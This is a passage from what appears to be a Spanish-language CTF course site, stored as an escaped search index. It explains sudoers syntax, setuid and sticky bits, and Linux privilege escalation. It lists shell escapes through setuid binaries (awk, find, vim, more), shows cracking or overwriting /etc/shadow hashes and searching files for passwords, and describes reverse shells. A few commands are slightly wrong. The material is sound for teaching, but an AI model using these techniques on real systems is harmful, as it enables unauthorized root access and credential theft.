superusuario. A continuación unos ejemplos de configuración, pero es posible leer más sobre ella en \u003ca href=\"https://toroid.org/sudoers-syntax\"\u003eeste artículo\u003c/a\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e%wheel \u003cspan class=\"nv\"\u003eALL\u003c/span\u003e\u003cspan class=\"o\"\u003e=(\u003c/span\u003eALL\u003cspan class=\"o\"\u003e)\u003c/span\u003e NOPASSWD: ALL\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eLo anterior quiere decir que todos los usuarios del grupo Wheel pueden ejecutar cualquier comando como cualquier usuario sin necesidad de solicitarles la contraseña.\u003c/p\u003e\n\u003cp\u003ePor otro lado, si se quieren asignar permisos solamente a un usuario, la sintaxis es así:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003eUser \u003cspan class=\"nv\"\u003eHost\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003eRunas\u003cspan class=\"o\"\u003e)\u003c/span\u003e Command\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eEsto quiere decr que el usuario \u003ccode\u003eUser\u003c/code\u003e puede ejecutar el comando \u003ccode\u003eCommand\u003c/code\u003e como el usuario \u003ccode\u003eRunas\u003c/code\u003e en el host \u003ccode\u003eHost\u003c/code\u003e. Si cualquiera de estos parámetros es \u003ccode\u003eALL\u003c/code\u003e, calza con cualquier usuario/host/comando. El valor \u003ccode\u003eCommand\u003c/code\u003e incluso puede ser el prefijo de un comando con argumentos incluidos. Y cuando calce con el comando ejecutado, se permitirá su utilización como otro usuario con \u003ccode\u003esudo\u003c/code\u003e. \u003cstrong\u003eOjo que el prefijo debe ser exacto\u003c/strong\u003e, es decir, si \u003ccode\u003ecommand\u003c/code\u003e incluye la ruta absoluta del comando a ejecutar con sudo, siempre será necesario declarar esa ruta absoluta.\u003c/p\u003e\n\u003ch3 id=\"setuid-setgid-y-sticky-bit\"\u003e\u003ccode\u003esetuid\u003c/code\u003e, \u003ccode\u003esetgid\u003c/code\u003e y \u003ccode\u003esticky bit\u003c/code\u003e\u003c/h3\u003e\n\u003cp\u003eExisten bits de permisos especiales en sistemas operativos basados en Unix, los cuales permiten la ejecución de un programa como si se fuera el usuario owner del archivo o se estuviera en el group del archivo. Estos se llaman \u003ccode\u003esetuid\u003c/code\u003e y \u003ccode\u003esetgid\u003c/code\u003e (para usuarios y grupos, respectivamente). Algunos comandos necesitan tener estos bits seteados para que puedan ser usados por cualquier otro usuario en el sistema.\u003c/p\u003e\n\u003cp\u003eTambién existe el \u003ccode\u003esticky bit\u003c/code\u003e, el cual en Linux permite configurar un directorio para que solamente su propietario pueda renombrar o eliminar archivos en él.\u003c/p\u003e\n\u003cp\u003eSu orden es el siguiente\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e| setuid | setgid | sticky |\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003ePara activar estos bits es necesario declarar un número octal extra al usar chmod. Por ejemplo, \u003ccode\u003echmod 6755\u003c/code\u003e cambia los permisos del archivo a \u003ccode\u003e755\u003c/code\u003e, pero al mismo tiempo setea los bit \u003ccode\u003esetuid\u003c/code\u003e, \u003ccode\u003esetgid\u003c/code\u003e y \u003ccode\u003esticky\u003c/code\u003e. Estos bit se verán de la siguiente forma al hacer \u003ccode\u003els\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003eeriveros@arcozen cc5325\u003cspan class=\"o\"\u003e]\u003c/span\u003e$ ls -alh\ntotal \u003cspan class=\"m\"\u003e0\u003c/span\u003e\ndrwxr-xr-x  \u003cspan class=\"m\"\u003e2\u003c/span\u003e eriveros eriveros  \u003cspan class=\"m\"\u003e60\u003c/span\u003e May \u003cspan class=\"m\"\u003e31\u003c/span\u003e 01:44 .\ndrwxrwxrwt \u003cspan class=\"m\"\u003e24\u003c/span\u003e root     root     \u003cspan class=\"m\"\u003e720\u003c/span\u003e May \u003cspan class=\"m\"\u003e31\u003c/span\u003e 01:44 ..\n-rwsr-sr-t  \u003cspan class=\"m\"\u003e1\u003c/span\u003e eriveros eriveros   \u003cspan class=\"m\"\u003e0\u003c/span\u003e May \u003cspan class=\"m\"\u003e31\u003c/span\u003e 01:44 file\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003ePor si no se nota, los bits \u003ccode\u003ex\u003c/code\u003e de \u003ccode\u003euser\u003c/code\u003e y \u003ccode\u003egroup\u003c/code\u003e cambian a \u003ccode\u003es\u003c/code\u003e (o \u003ccode\u003eS\u003c/code\u003e si la flag \u003ccode\u003ex\u003c/code\u003e del usuario o grupo no están seteadas) para indicar que se cuenta con los bits \u003ccode\u003esetuid\u003c/code\u003e y \u003ccode\u003esetgid\u003c/code\u003e fijados. En el caso del sticky bit, este se verá como una \u003ccode\u003et\u003c/code\u003e en el bit de ejecución \u003ccode\u003eother\u003c/code\u003e del archivo (o una \u003ccode\u003eT\u003c/code\u003e si es que other no tiene permiso de ejecución).\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eEn archivos\u003c/strong\u003e:\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003esetuid\u003c/code\u003e: Activar este bit sirve para que el usuario ejecute el programa como si fuera el usuario dueño del programa.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003esetgid\u003c/code\u003e: Activar este bit sirve para que el usuario ejecute el programa como si estuviese dentro del grupo dueño del programa.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003esticky bit\u003c/code\u003e: No se utiliza en archivos en Linux (no tiene efecto)\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eEn carpetas\u003c/strong\u003e:\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003esetuid\u003c/code\u003e: causa que los archivos y carpetas creados dentro de ella obtengan por defecto como \u003ccode\u003eowner\u003c/code\u003e al owner de la carpeta en la cual se setearon los bytes.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003esetgid\u003c/code\u003e: causa que los archivos y carpetas creados dentro de ella obtengan como grupo por defecto al grupo al que pertenece la carpeta en la cual se setearon los bytes.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003esticky bit\u003c/code\u003e: evita que las personas que no sean dueñas de una carpeta puedan crear o borrar archivos en ella.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"archivos-ocultos\"\u003eArchivos Ocultos\u003c/h3\u003e\n\u003cp\u003eSi bien esto no tiene que ver específicamente con permisos, es útil saber qué es un archivo oculto en Linux.\u003c/p\u003e\n\u003cp\u003eUn archivo oculto corresponde a un archivo que no se ve directamente al hacer \u003ccode\u003els\u003c/code\u003e de una carpeta. Estos archivos son todos los que su nombre parte con un punto \u003ccode\u003e.\u003c/code\u003e. Por ejemplo, en los directorios \u003ccode\u003e$HOME\u003c/code\u003e algunos programas guardan archivos de configuración o de estado especiales, cuyos nombres parten con punto. \u003ccode\u003e.bash_history\u003c/code\u003e (historial de comandos de bash), \u003ccode\u003e.bashrc\u003c/code\u003e (script que se ejecuta al iniciar una nueva sesión de bash), \u003ccode\u003e.config\u003c/code\u003e suelen ser carpetas y archivos ocultos que aparecen en los \u003ccode\u003e$HOME\u003c/code\u003e de usuarios debido a que otros programas los crean.\u003c/p\u003e\n\u003cp\u003ePara ver estos archivos, es necesario pasar la flag \u003ccode\u003e-a\u003c/code\u003e al comando \u003ccode\u003els\u003c/code\u003e. Esta flag se puede combinar con otras flags ya vistas (como \u003ccode\u003el\u003c/code\u003e y \u003ccode\u003en\u003c/code\u003e).\u003c/p\u003e\n"},{id:37,href:"/docs/pwning/escalamiento-privilegios/",title:"Escalamiento de Privilegios",description:null,content:"\u003cp\u003eTeniendo acceso de usuario limitado a una máquina, y entendiendo mejor cómo funcionan los permisos y privilegios en Linux, podemos intentar ejecutar un \u003cem\u003eescalamiento de privilegios\u003c/em\u003e, con el objetivo de conseguir acceso a un usuario con más permisos en la máquina. En el caso de un CTF, esto nos puede servir para acceder a archivos cuya lectura se encuentra limitada a ciertos usuarios. Estos archivos podrían contener pistas o incluso las flags que estamos buscando.\u003c/p\u003e\n\u003ch2 id=\"algunas-convenciones-de-escalamiento-de-privilegios-en-ctfs\"\u003eAlgunas convenciones de escalamiento de privilegios en CTFs\u003c/h2\u003e\n\u003cp\u003eHay algunas reglas implícitas en la ejecución de CTFs relacionadas con el escalamiento de privilegios, las cuales se enumeran a continuación:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eEn general se busca conseguir acceso al usuario \u003cem\u003eroot\u003c/em\u003e, aunque también puede servir contar con acceso a un usuario con permisos de \u003cem\u003esudo\u003c/em\u003e o a un usuario específico del sistema distinto al usuario con el que se inició el CTF.\u003c/li\u003e\n\u003cli\u003eA veces no es necesario conseguir acceso directo a \u003cem\u003eroot\u003c/em\u003e, sino que basta con usar algún proceso que tiene ese acceso para exfiltrar información de esa cuenta.\u003c/li\u003e\n\u003cli\u003eLuego de escalar privilegios con una cuenta, suele ser útil revisar su directorio \u003ccode\u003e$HOME\u003c/code\u003e:\n\u003cul\u003e\n\u003cli\u003eEn el caso de una cuenta \u003cem\u003eroot\u003c/em\u003e, este directorio se encuentra en \u003ccode\u003e/root/\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eEn el caso de otra cuenta, el directorio suele encontrarse en \u003ccode\u003e/home/\u0026lt;nombre_cuenta\u0026gt;\u003c/code\u003e, donde \u003ccode\u003e\u0026lt;nombre_cuenta\u0026gt;\u003c/code\u003e corresponde al nombre de usuario de la cuenta con privilegios.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eEn algunos casos, en el \u003ccode\u003e$HOME\u003c/code\u003e podría haber un archivo .txt (el cual podría estar oculto) con la flag, lo que finaliza el desafío. Sin embargo, si este archivo no existe, puede que necesitemos revisar si la flag está escondida de otra forma, o si podemos encontrar otra información interesante que nos permita avanzar en el desafío.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"lista-de-estrategias-genéricas-para-escalar-privilegios\"\u003eLista de estrategias genéricas para escalar privilegios\u003c/h2\u003e\n\u003cp\u003eA continuación enumeramos algunas estrategias comunes para escalar privilegios en CTFs, varias de las cuales se encuentran enumeradas en \u003ca href=\"https://d00mfist1.gitbooks.io/ctf/content/privilege_escalation_-_linux.html\"\u003eeste apunte\u003c/a\u003e. Todas estas estrategias asumen que ya tienes un usuario con (al menos) permisos limitados en la máquina del CTF.\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003e¿Qué privilegios tengo por defecto?\u003c/strong\u003e: Tal vez la cuenta en la que estás logueado ya tiene permisos de superusuario. Para revisar esto, podemos ejecutar el comando \u003ccode\u003esudo -ll\u003c/code\u003e. Este comando entregará información de si el usuario actual es o no un superusuario, o si tiene permisos para ejecutar algunos comandos con estos privilegios.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003e¿Están bien colocados los permisos y \u003cem\u003eowners\u003c/em\u003e de carpetas sensibles?\u003c/strong\u003e: Vale la pena revisar si las carpetas sensibles del sistema poseen los permisos correctos. Por ejemplo, la carpeta \u003ccode\u003e/root/\u003c/code\u003e podría estar abierta a lectura o incluso escritura para todos los usuarios (\u003ccode\u003er o rw\u003c/code\u003e en \u003ccode\u003eother\u003c/code\u003e). Esto se puede automatizar usando el comando \u003ccode\u003efile\u003c/code\u003e y la flag \u003ccode\u003e-perm\u003c/code\u003e seguida de \u003ccode\u003e-ugo\u003c/code\u003e (ojo con el guión al inicio), donde \u003ccode\u003eu\u003c/code\u003e, \u003ccode\u003eg\u003c/code\u003e y \u003ccode\u003eo\u003c/code\u003e son números en base octal que representan los permisos a buscar para el usuario (\u003ccode\u003eu\u003c/code\u003e), el grupo (\u003ccode\u003eo\u003c/code\u003e) o cualquiera (\u003ccode\u003eo\u003c/code\u003e). También están disponibles las flags \u003ccode\u003e-group\u003c/code\u003e y \u003ccode\u003e-name\u003c/code\u003e para filtrar por nombre y/o grupo del archivo o carpeta.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003efind / -perm -007\u003c/code\u003e buscaría desde la raíz del sistema de archivos todos los ficheros ejecutables por cualquier usuario.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003efind / -name root\u003c/code\u003e buscaría desde la raíz del sistema de archivos todos los ficheros cuyo dueño es el usuario \u003ccode\u003eroot\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003efind / -group root\u003c/code\u003e buscaría desde la raíz del sistema de archivos todos los ficheros cuyo grupo es \u003ccode\u003eroot\u003c/code\u003e.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003e¿Están bien colocados los privilegios de \u003ccode\u003e/etc/shadow/\u003c/code\u003e?\u003c/strong\u003e: En el archivo \u003ccode\u003e/etc/shadow\u003c/code\u003e se guardan los hashes de las contraseñas de los usuarios del sistema. Si es legible, podemos intentar crackearlas con \u003cem\u003eJohn the Ripper\u003c/em\u003e. Si es escribible, podemos cambiar un hash por uno elegido por nosotros:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003ejohn --wordlist=\u0026lt;wordlist\u0026gt; hash\u003c/code\u003e permite encontrar la palabra que genera cierto hash, donde \u003ccode\u003ehash\u003c/code\u003e es un archivo con el hash del archivo \u003ccode\u003e/etc/shadow\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eopenssl passwd -1\u003c/code\u003e crea un hash compatible con el archivo \u003ccode\u003e/etc/shadow\u003c/code\u003e.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003e¿Hay programas con flag \u003ccode\u003esetuid/setgid\u003c/code\u003e habilitadas para un usuario con privilegios?\u003c/strong\u003e: Puede que exista un programa con flags \u003ccode\u003esetuid/setgid\u003c/code\u003e que reciba una entrada que sea explotable como para escalar privilegios o acceder a contenido restringido. Esto se puede revisar también con el comando \u003ccode\u003efile\u003c/code\u003e y la flag \u003ccode\u003e-perm\u003c/code\u003e, pero usando un número de 4 cifras (la primera siendo el valor de \u003ccode\u003esetuid/setgid/sticky\u003c/code\u003e):\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003efind / -perm -4000 \u003c/code\u003e buscaría desde la raíz del sistema de archivos todos los archivos con \u003ccode\u003esetuid\u003c/code\u003e encendido.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003e¿Hay algún proceso corriendo con privilegios de forma periódica?\u003c/strong\u003e: En otros CTF existen programas que corren regularmente con un usuario con privilegios elevados, los cuales reciben de entrada algún archivo que es editable por un usuario con pocos privilegios. Modificar el archivo editable podría ayudar a cambiar el comportamiento del programa que corre automáticamente, facilitando la obtención de la \u003ccode\u003eflag\u003c/code\u003e. Es posible obtener estos procesos (y a veces la ruta del archivo ejecutable) con comandos especiales:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eTodos los procesos corriendo\u003c/strong\u003e: \u003ccode\u003eps aux\u003c/code\u003e o \u003ccode\u003etop\u003c/code\u003e. En el caso de \u003ccode\u003etop\u003c/code\u003e, se muestra una tabla scrolleable con las flechas que muestra una lista de los procesos corriendo en la máquina.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProcesos corriendo del usuario root\u003c/strong\u003e: \u003ccode\u003eps -u root\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003e¿Hay algún archivo de configuración con contraseñas?\u003c/strong\u003e: Similar a lo que vimos en la unidad de forense, buscar archivos de configuración con usuarios/contraseñas en texto plano puede servir para escalar en privilegios, asumiendo que una de las contraseñas encontradas podría ser reutilizada como contraseña de un usuario con más permisos. Acá lo que podemos hacer es ejecutar algo como \u003ccode\u003egrep -r password /\u003c/code\u003e para buscar recursivamente en todos los archivos del sistema de archivos.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003e¿Existe algún exploit específico para esta máquina?\u003c/strong\u003e: A veces la versión exacta del kernel de Linux o de algún programa corriendo en el sistema es propensa a algún exploit conocido. Para encontrar exploits asociados al sistema, podemos buscar sus aplicaciones y versiones con el comando \u003ccode\u003esearchsploit\u003c/code\u003e de Kali, o también buscar \u003ccode\u003eexploit \u0026lt;programa\u0026gt; \u0026lt;version\u0026gt;\u003c/code\u003e en nuestro buscador favorito para encontrar alguna prueba de concepto que nos permita escalar privilegios.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003ePara saber cuál es la versión del kernel de linux del sistema, ejecutar \u003ccode\u003euname -r\u003c/code\u003e.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2 id=\"bypasses-en-programas-especiales\"\u003eBypasses en programas especiales\u003c/h2\u003e\n\u003cp\u003eA continuación mencionaremos algunos ejemplos de programas comunes que podrían estar asociados a \u003ccode\u003eroot\u003c/code\u003e u otro usuario con privilegios y que podrían tener el byte \u003ccode\u003esetuid\u003c/code\u003e encendido, los cuales pueden ser usados para la ejecución arbitraria de código:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eawk\u003c/strong\u003e: el comando \u003ccode\u003esystem(\u0026quot;/bin/bash\u0026quot;)\u003c/code\u003e dentro de un bloque de \u003ccode\u003eawk\u003c/code\u003e permite ejecutar un programa de sistema, en este caso, una shell.\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eawk 'BEGIN {system(\u0026quot;/bin/bash\u0026quot;)}'\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003efind\u003c/strong\u003e: la flag \u003ccode\u003eexec\u003c/code\u003e permite ejecutar un comando sobre cada archivo encontrado. El siguiente comando podría servir para levantar una shell:\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003efind --exec bash -i\u003c/code\u003e.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003evim\u003c/strong\u003e: Luego de iniciar \u003ccode\u003evim\u003c/code\u003e, si presionas \u003ccode\u003eescape\u003c/code\u003e, escribes \u003ccode\u003e:shell\u003c/code\u003e y presionas \u003ccode\u003eenter\u003c/code\u003e podrás levantar una shell.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eless\u003c/strong\u003e: \u003ccode\u003eless\u003c/code\u003e es un programa que sirve para ver archivos de texto extensos de forma paginada. Si se presiona la tecla \u003ccode\u003ev\u003c/code\u003e luego de abrir un archivo con \u003ccode\u003eless\u003c/code\u003e, se abrirá \u003ccode\u003evim\u003c/code\u003e con los mismos permisos que \u003ccode\u003eless\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003emore\u003c/strong\u003e: Al igual que \u003ccode\u003eless\u003c/code\u003e, \u003ccode\u003emore\u003c/code\u003e permite leer archivos extensos. Si \u003ccode\u003emore\u003c/code\u003e abre un archivo cuya cantidad de líneas es mayor a la cantidad de líneas de la ventana de terminal, es posible levantar una shell escribiendo \u003ccode\u003e!/bin/bash\u003c/code\u003e.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eMuchos otros ejemplos aparecen en \u003ca href=\"https://d00mfist1.gitbooks.io/ctf/content/privilege_escalation_-_linux.html\"\u003eeste apunte\u003c/a\u003e, en la sección \u003cem\u003eAbusing sudo-rights\u003c/em\u003e. Además, \u003ca href=\"https://gtfobins.github.io/\"\u003eeste sitio\u003c/a\u003e agrupa una lista colaborativa de cientos de binarios con estas características.\u003c/p\u003e\n\u003cp\u003eLa recomendación general es que al encontrar algún otro programa con \u003ccode\u003esetuid\u003c/code\u003e y \u003ccode\u003eowner root\u003c/code\u003e, investiguen si existe una forma de ejecutar código arbitrario. Si el programa es conocido, busquen en su documentación o sitios de referencia y ayuda. Si el programa es un script propio de la máquina, revisen su código fuente para ver cómo abusar de sus funcionalidades para ejecutar código arbitrario.\u003c/p\u003e\n\u003ch2 id=\"scripts-de-enumeración-automática\"\u003eScripts de enumeración automática\u003c/h2\u003e\n\u003cp\u003eExisten muchas herramientas de código abierto que automatizan algunas de las recomendaciones entregadas en el paso anterior, además de ejecutar otras técnicas más avanzadas para intentar escalar privilegios en una máquina de CTF. A continuación enumeramos algunos de estos programas:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/mzet-/linux-exploit-suggester\"\u003eLinux Exploit Suggester\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/rebootuser/LinEnum\"\u003eLinEnum\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"http://pentestmonkey.net/tools/audit/unix-privesc-check\"\u003eUnix-Privesc-Check\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/reider-roque/linpostexp/blob/master/linprivchecker.py\"\u003eLinPrivchecker.py\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eLes recomendamos revisar también \u003ca href=\"https://github.com/Ignitetechnologies/Privilege-Escalation\"\u003eeste enlace\u003c/a\u003e para encontrar harto material de escalamiento de privilegios.\u003c/p\u003e\n\u003ch3 id=\"reverse-shell\"\u003eReverse Shell\u003c/h3\u003e\n\u003cp\u003eEn algunas ocasiones, si bien no podemos escalar privilegios directamente en el sistema, sí podemos hacer que el usuario root ejecute (a través de un trabajo periódico o de otra forma) un comando a nuestra elección. En estos casos, nos conviene levantar una \u003ccode\u003ereverse shell\u003c/code\u003e, es decir, hacer que el usuario root abra una sesión de shell y la deje disponible para que nos conectemos a ella vía \u003ccode\u003enc\u003c/code\u003e. Pueden ver la sección dedicada a \u003ccode\u003ereverse shells\u003c/code\u003e en la unidad de Aplicaciones Web para encontrar una explicación más detallada de esta técnica.\u003c/p\u003e\n"},{id:38,href:"/docs/pwning/buffer-overflow/",title:"Buffer Overflow",description:null,content:"\u003ch3 id=\"buffer-overflow\"\u003eBuffer Overflow\u003c/h3\u003e\n\u003cp\u003eLos ataques de secuestro de control de flujo consisten en aprovechar la entrada de datos de un programa para modificar las instrucciones a ejecutar por este, a partir del aprovechamiento de características propias de la arquitectura del sistema. En este apunte nos enfocaremos en un problema de seguridad denominado \u003cstrong\u003eBuffer Overflow\u003c/strong\u003e, el cual sobreescribe parte de la sección de memoria encargada de definir a qué líneas de código ejecutar.\u003c/p\u003e\n\u003cp\u003ePartiremos este capítulo explicando cómo funciona el manejo de memoria en sistemas con arquitectura x86, para luego hablar del ataque en específico. Finalizaremos con un pequeño ejemplo en código de cómo ejecutar un Buffer Overflow en un programa sin mecanismos de defensa.\u003c/p\u003e\n\u003ch3 id=\"instrucciones-y-registros-en-asm\"\u003eInstrucciones y registros en ASM\u003c/h3\u003e\n\u003cp\u003eComo ya se vio en el capítulo de Reversing, el código que escribimos al programar en un lenguaje compilado es transformado en un código equivalente en funcionalidad pero mucho más simple de interpretar, denominado \u003cem\u003eAssembler\u003c/em\u003e (ASM). Este código corre con varias restricciones que no aplican en lenguajes de programación de más alto nivel:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eLas variables utilizables de forma directa se llaman \u003cstrong\u003eregistros\u003c/strong\u003e y son limitadas en número y capacidad. Dependiendo de la arquitectura y del tipo de procesador, un registro puede guardar entre 8 y 256 bits. Los registros más importantes para conocer son:\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eeax\u003c/code\u003e, \u003ccode\u003eebx\u003c/code\u003e, \u003ccode\u003eecx\u003c/code\u003e, \u003ccode\u003eedx\u003c/code\u003e: Registros de 32 bits utilizados de forma general, por ejemplo, para almacenar argumentos de una función. Si se les quita la \u003ccode\u003ee\u003c/code\u003e que llevan de prefijo, representan registros de 16 bits, y si se les cambia la \u003ccode\u003eE\u003c/code\u003e por una \u003ccode\u003er\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eebp\u003c/code\u003e, \u003ccode\u003eesp\u003c/code\u003e, \u003ccode\u003eedi\u003c/code\u003e, \u003ccode\u003eesi\u003c/code\u003e, \u003ccode\u003eeip\u003c/code\u003e: Punteros, es decir, apuntan direcciones de memoria RAM en las cuales se encuentran datos a utilizar. La utilidad específica de algunos de ellos se explicará más adelante.\u003c/li\u003e\n\u003cli\u003eOperaciones \u003ccode\u003eadd\u003c/code\u003e, \u003ccode\u003esub\u003c/code\u003e, \u003ccode\u003emul\u003c/code\u003e, \u003ccode\u003ediv\u003c/code\u003e, \u003ccode\u003eand\u003c/code\u003e, \u003ccode\u003exor\u003c/code\u003e: Sirven para operar entre 2 registros o constantes. El valor se guarda en un tercer registro definido en la misma instrucción.\u003c/li\u003e\n\u003cli\u003eOperaciones de pila \u003ccode\u003epush\u003c/code\u003e y \u003ccode\u003epop\u003c/code\u003e: permiten sacar y agregar datos de una \u003cstrong\u003epila\u003c/strong\u003e, la cual se definirá en la siguiente sección\u003c/li\u003e\n\u003cli\u003eOperaciones de control de flujo \u003ccode\u003ecmp\u003c/code\u003e, \u003ccode\u003eje\u003c/code\u003e, \u003ccode\u003ejne\u003c/code\u003e, \u003ccode\u003ejg\u003c/code\u003e, \u003ccode\u003ejl\u003c/code\u003e: Permiten condicionar la ejecución de código según un resultado de comparación previo (con \u003ccode\u003ecmp\u003c/code\u003e). También permiten implementar \u003cstrong\u003eloops\u003c/strong\u003e.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eflags\u003c/code\u003e es un \u003ca href=\"https://en.wikipedia.org/wiki/FLAGS_register\"\u003eregistro especial\u003c/a\u003e donde se guarda información sobre el estado del procesador. Algunas de las cosas que se guardan en él son:\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eOF\u003c/code\u003e o \u003cem\u003eOverflow Flag\u003c/em\u003e, muestra si la última operación aritmética hizo overflow (hay reserva)\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ePF\u003c/code\u003e o \u003cem\u003eParity Flag\u003c/em\u003e, indica si el número de bits en valor 1 de la última operación binaria realizada es par o impar.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eZF\u003c/code\u003e o \u003cem\u003eZero Flag\u003c/em\u003e, indica que un resultado aritmético previo tenía valor 0.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eSF\u003c/code\u003e o \u003cem\u003eSign Flag\u003c/em\u003e, indica el signo de la última operación aritmética\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eCF\u003c/code\u003e o \u003cem\u003eCarry Flag\u003c/em\u003e, es usada para guardar una reserva en una operación aritmética, de forma de poder hacer operaciones con números más grandes que el tamaño de los registros.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"punteros\"\u003ePunteros\u003c/h3\u003e\n\u003cp\u003eA continuación mencionamos la utilidad de algunos punteros importantes:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eebp\u003c/code\u003e y \u003ccode\u003eesp\u003c/code\u003e marcan el inicio y el tope de la pila, respectivamente.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eedi\u003c/code\u003e y \u003ccode\u003eesi\u003c/code\u003e se suelen usar para operaciones de copia de Strings\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eeip\u003c/code\u003e: o \u003cem\u003einstruction pointer\u003c/em\u003e, apunta a la dirección de memoria en la cual se ubica la instrucción que se está ejecutando en ese momento.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"manejo-de-memoria\"\u003eManejo de Memoria\u003c/h3\u003e\n\u003cp\u003e\u003cimg src=\"../2021-06-17-00-17-38.png\" alt=\"Manejo de Memoria\"\u003e\u003c/p\u003e\n\u003cp\u003eLa imagen superior muestra cómo se ordena la memoria en un sistema x86. La imagen muestra las direcciones de memoria partiendo abajo y creciendo hacia arriba. Estas tienen un tamaño de 32 bits (4 bytes) y se acceden de 4 en 4 bytes.\u003c/p\u003e\n\u003cp\u003eExisten 6 bloques importantes en la memoria completa:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eStack (Pila)\u003c/strong\u003e Acá se almacenan las variables locales de los programas. Veremos más adelante que cada vez que se llama a una nueva función, se agrega un \u003cem\u003eframe\u003c/em\u003e al stack. Un \u003cem\u003eframe\u003c/em\u003e equivale al ambiente local inmediato de variables locales de una función. Como se ve en la imagen, \u003cstrong\u003eEl Stack crece hacia abajo\u003c/strong\u003e (direcciones de memoria decrecientes).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eEspacio Libre\u003c/strong\u003e: Entre el \u003cem\u003estack\u003c/em\u003e y el \u003cem\u003eheap\u003c/em\u003e hay memoria libre. El crecimiento de ambos disminuye la cantidad de memoria libre 